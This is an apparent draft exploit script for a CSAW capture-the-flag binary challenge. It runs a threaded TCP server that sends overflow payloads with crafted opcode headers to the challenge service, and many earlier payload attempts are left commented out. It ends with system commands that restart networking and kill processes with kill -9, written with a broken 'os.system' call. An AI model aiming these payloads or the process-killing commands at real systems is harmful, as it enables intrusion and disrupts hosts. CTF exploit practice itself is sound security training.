#!/usr/bin/env python
import SocketServer
from pwn import *
from sys import stdin, stdout, argv
from struct import pack
from os import urandom, system
from time import *
THREADS = ord("c") # 99

REMOTE_SERVER = "localhost"
REMOTE_PORT   = 24242


# REMOTE_SERVER = "pwn.chal.csaw.io"
# REMOTE_PORT   = 8004

SOCKET_SERVER = "0.0.0.0"
SOCKET_PORT   = 6001 #int(sys.argv[1])

numThreads = 16
thread = 0
# threadList = [None for x in xrange(numThreads)]

# opcodes = [
#     "\x83\x00\x00\xff",
#     "\x84\xff\xff\xff\xfa",
#     "\x84\xff\xff\xff\xfa678",
#     "\x84\x80\x00\x00\x00",
#     "\x84\x83\x82\x81\xff"
# ]

# payloads = [
#     "\x01T"*0x7fff,
#     "AAAA"
# ]

# EABE was the
# payloads = [
#     "\x04EAAA"*64,
#     "\x04EBBB",
#     "\x04ECCC",
#     "\x04EDDD",
#     "\x04EAEE\x04EABE\x04EABC\x04EABC\x04EABC\x04EABC\x04EDBC\x04EDEC\x04EDEF\x04EDEF\x04EDEF\x04EAEF\x04EABF\x04EABC\x04EABC\x04EABC\x04EABC\x04EABC\x04EEBC\x04EEEC\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE\x04EEEE"
# ]
# payloads = [
#     "\x81\x00\x00\x02\xff" + '\xff'*(128 + 3 + 4*6 + 4*4*12) + "BBBB"*100,
#     "\x81\x00\x00\x02\xff",
#     ""
# ]
    # "B"*(128) + "BBBB" lines up wiht that weird thing
payloads = [
    "A"*(126 + 5 + 10 + 1 + 100),
    "A"*(126) + "\x84\x7f\xff\xff\xff" + 'A'*10 + "0x80",
    "B"*(126)
]

# thinking logically about this 

# spray E's everywhere
# ... or not that was stupid 


# payloads = [chr(a)*4 for a in range(ord('A'), ord('Z')+1)]


header = lambda c: "\x01\x00"+p16(len(c))+p32(0)


# if special:
#     returnThing += "\x84\xff\xff\xff\xfa678"*CD
#     # returnThing += "\x80"*4
# else:
#     returnThing += "\x84\xff\xff\xff\xf067\x80"*CD
# returnThing += opcodeData
# print returnThing.encode('hex')

# return returnThing

class TCPHandler(SocketServer.BaseRequestHandler):

    def serverResponse(self, response):
        # if "T" in response:
        #     print "yep"

        stdout.write("\033[1;36mServer Said: \033[39m{}\033[0m\n".format(response.encode('hex')))
        stdout.write("\033[1;36mServer Said: \033[39m{}\033[0m\n".format(response))
        stdout.flush()

    def handle(self):
        global thread
        payload = payloads[thread%len(payloads)]
        thread += 1
        # b = thread
        # if thread%2 == 0:
        #     sleep(0.0015)
            # raw_input('continue?')
        # sleep(b * 0.001)
        # send the header and then wait
        if thread < 5 or thread > 14:
            sleep(0.1*thread)
        package = header(payload) + payload

        # print package.encode('hex')
        self.request.sendall(package)
        recieved = self.request.recv(1024)
        self.serverResponse(recieved)

# Create server and bind
server = SocketServer.ThreadingTCPServer(("0.0.0.0",SOCKET_PORT),TCPHandler)


# Initialise remote client
rmsrv = remote(REMOTE_SERVER, REMOTE_PORT)
clientData = pack("<HH", numThreads, SOCKET_PORT)
rmsrv.sendline(clientData)
rmsrv.close()

server.allow_reuse_address=True

# for x in range(numThreads):
# server.handle_request()
server.serve_forever()

server.server_close()



os.system("/etc/init.d/networking restart")
os.system("netstat -pant | grep mom | grep -v LISTEN | cut -d\   -f 36 | sed 's/\/.*//g' | xargs kill -9")



print 







